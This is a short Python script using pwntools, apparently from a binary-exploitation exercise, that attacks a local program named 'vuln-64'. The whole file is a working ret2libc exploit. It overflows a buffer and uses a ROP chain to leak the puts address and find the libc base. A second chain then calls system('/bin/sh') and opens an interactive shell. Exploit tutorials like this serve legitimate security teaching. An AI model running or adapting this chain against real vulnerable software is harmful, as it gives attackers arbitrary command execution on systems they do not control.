from pwn import *

elf = context.binary = ELF('./vuln-64')
libc = elf.libc
p = process()

POP_RDI = 0x4011cb

p.recvline()

payload = flat(
    'A' * 40,
    POP_RDI,
    elf.got['puts'],
    elf.plt['puts'],
    elf.sym['main'],
)

p.sendline(payload)

# libc addresses are often only 6 bytes long, meaning they are preceded with 0x0000
# but this won't be read as it's a null byte, so only read 6 bytes and append the null ones later
puts_leak = u64(p.recv(6) + b'\x00\x00')
p.recvlines(2)

libc.address = puts_leak - libc.sym['puts']
# log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
    'A' * 40,
    POP_RDI,
    next(libc.search(b'/bin/sh\x00')),
    libc.sym['system'],
    libc.sym['exit'],
)

p.sendline(payload)

p.interactive()